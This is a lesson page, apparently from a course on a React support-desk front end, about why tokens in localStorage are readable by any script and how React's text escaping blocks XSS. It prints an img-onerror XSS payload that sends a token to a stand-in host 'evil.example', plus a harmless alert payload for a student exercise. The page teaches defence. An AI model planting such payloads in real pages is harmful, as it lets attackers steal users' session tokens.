@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Any Script on the Page Can Read It — Support Desk Front-End</title>
+  <link rel="stylesheet" href="/support-desk-front-end/assets/hljs-theme.css">
+  <link rel="stylesheet" href="/support-desk-front-end/assets/style.css">
+</head>
+<body>
+  <nav class="site-nav">
+    <div class="site-nav-inner">
+      <div class="nav-slot nav-slot-left">
+        <a class="nav-home" href="/support-desk-front-end/index.html" aria-label="Home">
+          <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor"
+               stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M3 11 12 3l9 8" />
+            <path d="M5 10v10a1 1 0 0 0 1 1h4v-6h4v6h4a1 1 0 0 0 1-1V10" />
+          </svg>
+        </a>
+        <a class="nav-prev" href="/support-desk-front-end/login-and-roles/logging-in-and-keeping-the-token/whats-inside-a-token.html">← What&#39;s Inside a Token</a>
+      </div>
+      <div class="nav-slot nav-slot-center">
+        <a class="nav-up" href="/support-desk-front-end/login-and-roles/logging-in-and-keeping-the-token/index.html">↑ Up</a>
+      </div>
+      <div class="nav-slot nav-slot-right">
+        <a class="nav-next" href="/support-desk-front-end/login-and-roles/logging-in-and-keeping-the-token/gettoken-reads-the-saved-token.html">getToken() Reads the Saved Token →</a>
+      </div>
+    </div>
+  </nav>
+
+  <main class="content">
+    <h1>Any Script on the Page Can Read It</h1>
+    <p class="lede">The Console just read the token, and so could any other JavaScript on the page. That&#39;s the trade-off of localStorage, and why React showing text as text matters.</p>
+
+    
+
+    
+      <div class="slide-body"><p>On the last slide, three lines in the Console read the token. Code typed
+into the Console runs <strong>on the page</strong>, like the app's own code. So any
+JavaScript that runs on the page can do the same. <code>tokenStorage.js</code>
+says so in its top comment:</p>
+<pre><code class="hljs language-js"><span class="hljs-comment">// Figure 4.4: the trade-off (src/api/tokenStorage.js, top comment)</span>
+<span class="hljs-comment">// The trade-off: any JavaScript running on the page can read localStorage.</span>
+<span class="hljs-comment">// If an attacker ever got a script onto the page (an XSS attack), they</span>
+<span class="hljs-comment">// could copy the token. The safer alternative is an httpOnly cookie, which</span>
+<span class="hljs-comment">// scripts can&#x27;t read at all, but that needs changes to the back-end, so</span>
+<span class="hljs-comment">// this app keeps localStorage and is careful never to run other people&#x27;s</span>
+<span class="hljs-comment">// code.</span>
+</code></pre>
+<h2>What an XSS attack is</h2>
+<p><strong>XSS</strong> (cross-site scripting) means getting <strong>your</strong> JavaScript to run
+on <strong>someone else's</strong> page. The usual way in is text that users type
+and other users see: a ticket's subject, a comment. If a page ever
+treated that text as HTML, a &quot;subject&quot; like</p>
+<pre><code class="hljs language-html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;sendTheTokenTo(&#x27;evil.example&#x27;)&quot;</span>&gt;</span>
+</code></pre>
+<p>would become a real image tag in everyone's browser, and its <code>onerror</code>
+code would run there, with access to their token.</p>
+<h2>What protects this app</h2>
+<p>React writes <code>{ticket.subject}</code> as <strong>text</strong>, never as HTML. A subject
+full of angle brackets shows up on screen as angle brackets. Blade's
+<code>{{ $ticket-&gt;subject }}</code> does the same, for the same reason.</p>
+<p>React has exactly one way to insert raw HTML, and it's named
+<code>dangerouslySetInnerHTML</code> so nobody uses it by accident. This app never
+uses it.</p>
+<h2>The alternative</h2>
+<p>An <strong>httpOnly cookie</strong> is one that the browser sends with requests but
+won't let any script read, so XSS can't steal it. Laravel's session
+cookie is httpOnly. Using one here would mean back-end changes: setting
+the cookie at login, reading it instead of the <code>Authorization</code> header,
+changing the CORS settings, and protecting against a different attack
+(CSRF). For this module, <code>localStorage</code> and care are the trade-off.</p>
+<h2>Try it</h2>
+<p>Log in as Casey and create a ticket with this subject:</p>
+<pre><code class="hljs language-html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;This ran!&#x27;)&quot;</span>&gt;</span>
+</code></pre>
+<p>What do you see in the ticket list, and on the ticket's page? Does the
+alert appear? Then, without changing anything, explain which part of
+<code>TicketList.jsx</code> made the difference.</p>
+</div>
+    
+  </main>
+</body>
+</html>
